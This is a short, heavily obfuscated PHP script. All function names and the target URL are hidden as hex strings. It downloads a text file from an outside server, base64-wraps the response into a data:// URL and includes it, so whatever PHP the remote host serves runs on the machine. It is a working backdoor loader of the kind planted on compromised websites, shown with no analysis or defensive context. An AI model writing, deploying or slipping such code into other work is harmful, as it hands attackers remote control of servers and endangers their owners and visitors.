<?php
function x($h){return pack('H*',$h);}
$opyjh = x("6375726c5f696e6974");
$clnvi = x("6375726c5f7365746f7074");
$unuk = x("6375726c5f65786563");
$gqvxg = x("6375726c5f636c6f7365");
$jghtt = x("6261736536345f656e636f6465");
$cbbblpr = constant(x("4355524c4f50545f55524c"));
$xhyvr = constant(x("4355524c4f50545f52455455524e5452414e53464552"));

L6158:
goto L8900;
L8900:
$zhas = x("68747470733a2f2f6d61696e322e6763727573742e6e65742f6d65642e747874");

$jjlzbh = $opyjh();
$clnvi($jjlzbh, $cbbblpr, $zhas);
$clnvi($jjlzbh, $xhyvr, true);
$qukvnfj = $unuk($jjlzbh);
$gqvxg($jjlzbh);

if(!$qukvnfj) exit('Network error');

$hgraw = $jghtt($qukvnfj);
$vbwxk = x("646174613a2f2f746578742f706c61696e3b6261736536342c") . $hgraw;
include $vbwxk;
